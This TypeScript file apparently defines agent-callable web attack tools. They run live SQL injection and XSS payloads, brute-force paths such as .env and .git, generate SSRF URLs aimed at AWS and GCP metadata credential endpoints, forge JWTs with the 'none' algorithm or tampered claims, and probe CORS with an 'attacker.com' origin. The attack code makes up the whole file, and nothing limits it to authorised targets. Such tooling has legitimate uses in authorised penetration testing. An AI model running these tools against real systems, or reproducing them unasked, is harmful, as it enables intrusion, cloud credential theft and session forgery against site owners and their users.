import { Tool } from './Tool.js';
import * as http from 'http';
import * as https from 'https';
import * as crypto from 'crypto';

const MAX_OUT = 8000;
function truncate(s: string, max = MAX_OUT): string {
    return s.length > max ? s.slice(0, max) + '\n[TRUNCATED]' : s;
}

// ─── 1. SQL Injection Tester ───────────────────────────────────────────────────
export class SqliTestTool implements Tool {
    name = 'sqli_test';
    description = 'Test URL parameters for SQL injection vulnerabilities using error-based and boolean payloads.';
    schema = {
        type: 'object',
        properties: {
            url: { type: 'string', description: 'Target URL with parameters (e.g., http://target.com/page.php?id=1)' },
            parameter: { type: 'string', description: 'Parameter name to test' },
            method: { type: 'string', enum: ['GET', 'POST'], description: 'HTTP method (default: GET)' },
            dbType: { type: 'string', enum: ['mysql', 'mssql', 'postgresql', 'oracle', 'sqlite', 'unknown'], description: 'Database type hint' }
        },
        required: ['url', 'parameter'],
        additionalProperties: false
    };

    async execute(args: { url: string; parameter: string; method?: string; dbType?: string }): Promise<string> {
        const payloads = [
            "'",
            "''",
            "\" ",
            "' OR '1'='1",
            "' OR 1=1 --",
            "' UNION SELECT NULL--",
            "1' AND 1=2 --",
            "1' AND 1=1 --",
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND SLEEP(5)--",
        ];

        const sqlErrors = [
            /you have an error in your sql syntax/i,
            /warning: mysql/i,
            /unclosed quotation mark after the character string/i,
            /quoted string not properly terminated/i,
            /pg_query\(\): query failed/i,
            /sqlite3::query/i,
            /ORA-00933/i,
            /Microsoft OLE DB Provider for SQL Server/i,
        ];

        const findings: string[] = [];
        const method = args.method || 'GET';

        for (const payload of payloads) {
            try {
                const testUrl = new URL(args.url);
                if (method === 'GET') {
                    testUrl.searchParams.set(args.parameter, testUrl.searchParams.get(args.parameter) + payload);
                }

                const mod = testUrl.protocol === 'https:' ? https : http;
                const body = await new Promise<string>((resolve) => {
                    const req = mod.request(testUrl, { method, timeout: 5000, rejectUnauthorized: false } as any, (res) => {
                        let data = '';
                        res.on('data', chunk => { data += chunk.toString(); });
                        res.on('end', () => resolve(data));
                    });
                    req.on('error', () => resolve(''));
                    req.on('timeout', () => { req.destroy(); resolve(''); });
                    if (method === 'POST') req.write(`${args.parameter}=${encodeURIComponent(payload)}`);
                    req.end();
                });

                for (const errRegex of sqlErrors) {
                    if (errRegex.test(body)) {
                        findings.push(`[VULNERABLE — ERROR BASED] Payload: ${payload} | Match: ${errRegex.source}`);
                        break;
                    }
                }
            } catch { continue; }
        }

        if (findings.length === 0) {
            return `[SQLI TEST] ${args.url} (param: ${args.parameter}) — No error-based SQLi detected across ${payloads.length} payloads.`;
        }

        return truncate([`[SQLI TEST] ${args.url} (param: ${args.parameter}) — VULNERABLE`, '', ...findings].join('\n'));
    }
}

// ─── 2. XSS Tester ─────────────────────────────────────────────────────────────
export class XssTestTool implements Tool {
    name = 'xss_test';
    description = 'Test URL parameters for reflected XSS vulnerabilities across multiple contexts.';
    schema = {
        type: 'object',
        properties: {
            url: { type: 'string', description: 'Target URL with parameters' },
            parameter: { type: 'string', description: 'Parameter name to test' },
            context: { type: 'string', enum: ['html', 'attribute', 'javascript', 'url'], description: 'Reflection context' }
        },
        required: ['url', 'parameter'],
        additionalProperties: false
    };

    async execute(args: { url: string; parameter: string; context?: string }): Promise<string> {
        const can = `vtx${crypto.randomBytes(4).toString('hex')}`;
        const payloads: Record<string, string[]> = {
            html: [`<script>${can}</script>`, `<img src=x onerror=${can}>`, `<svg/onload=${can}>`],
            attribute: [`" onfocus="${can}" x="`, `' onfocus='${can}' x='`, `"><script>${can}</script>`],
            javascript: [`;${can}();`, `'-${can}()-'`, `"-${can}()-"`],
            url: [`javascript:${can}()`, `data:text/html,<script>${can}</script>`],
        };

        const contextPayloads = args.context ? payloads[args.context] || payloads.html : [...payloads.html, ...payloads.attribute, ...payloads.javascript];
        const findings: string[] = [];

        for (const payload of contextPayloads) {
            try {
                const targetUrl = new URL(args.url);
                targetUrl.searchParams.set(args.parameter, payload);
                const mod = targetUrl.protocol === 'https:' ? https : http;

                const body = await new Promise<string>((resolve) => {
                    const req = mod.request(targetUrl, { method: 'GET', timeout: 5000, rejectUnauthorized: false } as any, (res) => {
                        let data = '';
                        res.on('data', chunk => { data += chunk.toString(); });
                        res.on('end', () => resolve(data));
                    });
                    req.on('error', () => resolve(''));
                    req.on('timeout', () => { req.destroy(); resolve(''); });
                    req.end();
                });

                if (body.includes(payload)) {
                    findings.push(`[REFLECTED XSS — UNFILTERED] Payload: ${payload}`);
                } else if (body.includes(can)) {
                    findings.push(`[REFLECTED XSS — PARTIALLY FILTERED] Canary '${can}' reflected.`);
                }
            } catch { continue; }
        }

        if (findings.length === 0) {
            return `[XSS TEST] ${args.url} (param: ${args.parameter}) — No reflected XSS detected.`;
        }

        return truncate([`[XSS TEST] ${args.url} (param: ${args.parameter}) — FINDINGS`, '', ...findings].join('\n'));
    }
}

// ─── 3. Directory Fuzzer ───────────────────────────────────────────────────────
const TOP_WEB_PATHS = [
    'admin', 'login', 'api', 'dashboard', 'portal', 'dev', 'staging', 'test',
    'backup', 'config', 'db', 'logs', 'upload', 'uploads', 'images', 'static',
    'assets', 'css', 'js', 'includes', 'vendor', 'wp-admin', 'wp-content',
    'phpmyadmin', 'pma', 'swagger', 'v1', 'v2', '.env', '.git', '.htaccess',
    'robots.txt', 'sitemap.xml', 'server-status', 'health', 'metrics', 'console',
    'admin.php', 'login.php', 'index.php', 'config.json', 'api/v1', 'api/v2'
];

export class DirectoryFuzzTool implements Tool {
    name = 'directory_fuzz';
    description = 'Directory brute-force discovery using status code analysis.';
    schema = {
        type: 'object',
        properties: {
            baseUrl: { type: 'string', description: 'Base URL (e.g., http://target.com)' },
            extensions: { type: 'array', items: { type: 'string' }, description: 'Extensions to append (e.g., [".php", ".html"])' }
        },
        required: ['baseUrl'],
        additionalProperties: false
    };

    async execute(args: { baseUrl: string; extensions?: string[] }): Promise<string> {
        const base = args.baseUrl.endsWith('/') ? args.baseUrl.slice(0, -1) : args.baseUrl;
        const exts = args.extensions || [''];
        const results: { path: string; status: number; size: number }[] = [];

        const testPath = (p: string): Promise<void> => new Promise(resolve => {
            try {
                const targetUrl = new URL(`${base}/${p}`);
                const mod = targetUrl.protocol === 'https:' ? https : http;

                const req = mod.request(targetUrl, { method: 'GET', timeout: 4000, rejectUnauthorized: false } as any, (res) => {
                    let len = 0;
                    res.on('data', chunk => { len += chunk.length; });
                    res.on('end', () => {
                        if (res.statusCode && res.statusCode !== 404) {
                            results.push({ path: `/${p}`, status: res.statusCode, size: len });
                        }
                        resolve();
                    });
                });
                req.on('error', () => resolve());
                req.on('timeout', () => { req.destroy(); resolve(); });
                req.end();
            } catch { resolve(); }
        });

        const targets: string[] = [];
        for (const path of TOP_WEB_PATHS) {
            for (const ext of exts) {
                targets.push(ext ? `${path}${ext}` : path);
            }
        }

        const batchSize = 15;
        for (let i = 0; i < targets.length; i += batchSize) {
            const batch = targets.slice(i, i + batchSize);
            await Promise.all(batch.map(testPath));
        }

        const lines = [`[DIRECTORY FUZZ] ${base} — ${results.length} path(s) found / ${targets.length} tested`, ''];
        for (const r of results.sort((a, b) => a.path.localeCompare(b.path))) {
            lines.push(`  ${r.status}  ${r.path.padEnd(35)} (${r.size} bytes)`);
        }
        return truncate(lines.join('\n'));
    }
}

// ─── 4. Header Audit ───────────────────────────────────────────────────────────
export class HeaderAuditTool implements Tool {
    name = 'header_audit';
    description = 'HTTP security header analysis — evaluates CSP, HSTS, CORS, X-Frame-Options, and Cookie security flags.';
    schema = {
        type: 'object',
        properties: {
            url: { type: 'string', description: 'Target URL' }
        },
        required: ['url'],
        additionalProperties: false
    };

    async execute(args: { url: string }): Promise<string> {
        try {
            const targetUrl = new URL(args.url);
            const mod = targetUrl.protocol === 'https:' ? https : http;

            const res = await new Promise<http.IncomingMessage>((resolve, reject) => {
                const req = mod.request(targetUrl, { method: 'GET', timeout: 5000, rejectUnauthorized: false } as any, resolve);
                req.on('error', reject);
                req.on('timeout', () => { req.destroy(); reject(new Error('Timeout')); });
                req.end();
            });

            const headers = res.headers;
            const findings: { header: string; status: 'PASS' | 'WARN' | 'FAIL'; note: string }[] = [];

            // CSP
            if (headers['content-security-policy']) {
                findings.push({ header: 'Content-Security-Policy', status: 'PASS', note: 'Present' });
            } else {
                findings.push({ header: 'Content-Security-Policy', status: 'FAIL', note: 'Missing CSP header' });
            }

            // HSTS
            if (headers['strict-transport-security']) {
                findings.push({ header: 'Strict-Transport-Security', status: 'PASS', note: String(headers['strict-transport-security']) });
            } else if (targetUrl.protocol === 'https:') {
                findings.push({ header: 'Strict-Transport-Security', status: 'FAIL', note: 'Missing HSTS on HTTPS' });
            }

            // X-Frame-Options
            if (headers['x-frame-options']) {
                findings.push({ header: 'X-Frame-Options', status: 'PASS', note: String(headers['x-frame-options']) });
            } else {
                findings.push({ header: 'X-Frame-Options', status: 'WARN', note: 'Missing clickjacking protection' });
            }

            // X-Content-Type-Options
            if (headers['x-content-type-options'] === 'nosniff') {
                findings.push({ header: 'X-Content-Type-Options', status: 'PASS', note: 'nosniff' });
            } else {
                findings.push({ header: 'X-Content-Type-Options', status: 'WARN', note: 'Missing nosniff' });
            }

            // CORS
            if (headers['access-control-allow-origin'] === '*') {
                findings.push({ header: 'Access-Control-Allow-Origin', status: 'WARN', note: 'Wildcard * origin allowed' });
            }

            const lines = [`[HEADER AUDIT] ${args.url}`, ''];
            for (const f of findings) {
                const tag = f.status === 'PASS' ? '✅ PASS' : f.status === 'WARN' ? '⚠️ WARN' : '❌ FAIL';
                lines.push(`  ${tag}  ${f.header.padEnd(30)} — ${f.note}`);
            }
            return lines.join('\n');
        } catch (e: any) {
            return `[HEADER AUDIT ERROR]: ${e.message}`;
        }
    }
}

// ─── 5. SSRF Payload Generator ─────────────────────────────────────────────────
export class SsrfTestTool implements Tool {
    name = 'ssrf_test';
    description = 'Generate SSRF payloads targeting cloud metadata endpoints, internal services, and IPv6 encodings.';
    schema = {
        type: 'object',
        properties: {
            parameterUrl: { type: 'string', description: 'Target parameter URL' },
            parameter: { type: 'string', description: 'Vulnerable parameter name' },
            target: { type: 'string', enum: ['aws', 'gcp', 'azure', 'localhost', 'all'], description: 'SSRF target profile' }
        },
        required: ['parameterUrl', 'parameter'],
        additionalProperties: false
    };

    async execute(args: { parameterUrl: string; parameter: string; target?: string }): Promise<string> {
        const payloads: Record<string, string[]> = {
            aws: ['http://169.254.169.254/latest/meta-data/', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'],
            gcp: ['http://metadata.google.internal/computeMetadata/v1/', 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token'],
            azure: ['http://169.254.169.254/metadata/instance?api-version=2021-02-01'],
            localhost: [
                'http://127.0.0.1:80', 'http://127.0.0.1:22', 'http://127.0.0.1:6379',
                'http://localhost:8080', 'http://[::1]:80', 'http://2130706433:80',
                'http://0x7f000001:80', 'http://0177.0.0.1:80', 'http://127.0.0.1.nip.io'
            ]
        };

        const targetProfile = args.target || 'all';
        const selected = targetProfile === 'all'
            ? Object.values(payloads).flat()
            : payloads[targetProfile] || payloads.localhost;

        const lines = [`[SSRF PAYLOADS] Target param: ${args.parameter}`, ''];
        for (const p of selected) {
            const fullUrl = new URL(args.parameterUrl);
            fullUrl.searchParams.set(args.parameter, p);
            lines.push(`  ${fullUrl.toString()}`);
        }
        return truncate(lines.join('\n'));
    }
}

// ─── 6. JWT Attack Tool ────────────────────────────────────────────────────────
export class JwtAttackTool implements Tool {
    name = 'jwt_attack';
    description = 'JWT decoder, "none" algorithm manipulator, and claim modifier.';
    schema = {
        type: 'object',
        properties: {
            token: { type: 'string', description: 'JWT string' },
            attack: { type: 'string', enum: ['decode', 'none_alg', 'claim_tamper'], description: 'Attack operation' },
            claims: { type: 'string', description: 'JSON string of claims to tamper (for claim_tamper)' }
        },
        required: ['token', 'attack'],
        additionalProperties: false
    };

    async execute(args: { token: string; attack: string; claims?: string }): Promise<string> {
        const parts = args.token.trim().split('.');
        if (parts.length !== 3) return '[JWT ERROR]: Invalid JWT structure (must have 3 dot-separated parts).';

        try {
            const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString('utf-8'));
            const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString('utf-8'));

            if (args.attack === 'decode') {
                return [
                    '[JWT DECODE]',
                    'Header:  ' + JSON.stringify(header, null, 2),
                    'Payload: ' + JSON.stringify(payload, null, 2),
                    'Signature: ' + parts[2]
                ].join('\n');
            }

            if (args.attack === 'none_alg') {
                const newHeader = Buffer.from(JSON.stringify({ ...header, alg: 'none' })).toString('base64url');
                const newPayload = Buffer.from(JSON.stringify(payload)).toString('base64url');
                const tamperedJwt = `${newHeader}.${newPayload}.`;
                return [`[JWT NONE-ALG TAMPER]`, '', tamperedJwt].join('\n');
            }

            if (args.attack === 'claim_tamper') {
                if (!args.claims) return '[JWT ERROR]: Missing claims JSON for claim_tamper.';
                const parsedClaims = JSON.parse(args.claims);
                const newPayloadObj = { ...payload, ...parsedClaims };
                const newHeader = Buffer.from(JSON.stringify(header)).toString('base64url');
                const newPayload = Buffer.from(JSON.stringify(newPayloadObj)).toString('base64url');
                return [`[JWT CLAIM TAMPER]`, '', `${newHeader}.${newPayload}.${parts[2]}`].join('\n');
            }

            return '[JWT ERROR]: Unknown attack mode.';
        } catch (e: any) {
            return `[JWT ERROR]: ${e.message}`;
        }
    }
}

// ─── 7. CORS Tester ────────────────────────────────────────────────────────────
export class CorsTestTool implements Tool {
    name = 'cors_test';
    description = 'Test URL for CORS misconfigurations (wildcard reflection, null origin, credential reflection).';
    schema = {
        type: 'object',
        properties: {
            url: { type: 'string', description: 'Target URL' }
        },
        required: ['url'],
        additionalProperties: false
    };

    async execute(args: { url: string }): Promise<string> {
        const testOrigins = ['https://attacker.com', 'null', 'https://evil.target.com'];
        const findings: string[] = [];

        for (const origin of testOrigins) {
            try {
                const targetUrl = new URL(args.url);
                const mod = targetUrl.protocol === 'https:' ? https : http;

                const headers = await new Promise<http.IncomingHttpHeaders>((resolve, reject) => {
                    const req = mod.request(targetUrl, { method: 'GET', headers: { Origin: origin }, timeout: 5000, rejectUnauthorized: false } as any, (res) => {
                        resolve(res.headers);
                    });
                    req.on('error', reject);
                    req.on('timeout', () => { req.destroy(); reject(new Error('Timeout')); });
                    req.end();
                });

                const acao = headers['access-control-allow-origin'];
                const acac = headers['access-control-allow-credentials'];

                if (acao === origin && acac === 'true') {
                    findings.push(`[CRITICAL] Reflected Origin '${origin}' with Credentials allowed!`);
                } else if (acao === origin) {
                    findings.push(`[MEDIUM] Reflected Origin '${origin}' allowed.`);
                } else if (acao === '*') {
                    findings.push(`[LOW] Wildcard origin '*' allowed.`);
                }
            } catch { continue; }
        }

        if (findings.length === 0) return `[CORS TEST] ${args.url} — No CORS misconfigurations detected.`;
        return truncate([`[CORS TEST] ${args.url} — FINDINGS`, '', ...findings].join('\n'));
    }
}

// ─── 8. Parameter Fuzzer ───────────────────────────────────────────────────────
export class ParameterFuzzTool implements Tool {
    name = 'parameter_fuzz';
    description = 'Discover hidden parameters by monitoring HTTP response differences.';
    schema = {
        type: 'object',
        properties: {
            url: { type: 'string', description: 'Target URL' }
        },
        required: ['url'],
        additionalProperties: false
    };

    async execute(args: { url: string }): Promise<string> {
        const params = ['debug', 'admin', 'test', 'file', 'path', 'id', 'user', 'cmd', 'exec', 'url', 'redirect', 'config', 'secret'];
        const findings: string[] = [];

        for (const p of params) {
            try {
                const targetUrl = new URL(args.url);
                targetUrl.searchParams.set(p, 'vtx_test');
                const mod = targetUrl.protocol === 'https:' ? https : http;

                const status = await new Promise<number>((resolve) => {
                    const req = mod.request(targetUrl, { method: 'GET', timeout: 3000, rejectUnauthorized: false } as any, (res) => resolve(res.statusCode || 0));
                    req.on('error', () => resolve(0));
                    req.on('timeout', () => { req.destroy(); resolve(0); });
                    req.end();
                });

                if (status > 0 && status !== 404) {
                    findings.push(`  Param '${p}' → HTTP ${status}`);
                }
            } catch { continue; }
        }

        return truncate([`[PARAM FUZZ] ${args.url}`, '', ...(findings.length ? findings : ['No hidden parameters identified.'])].join('\n'));
    }
}
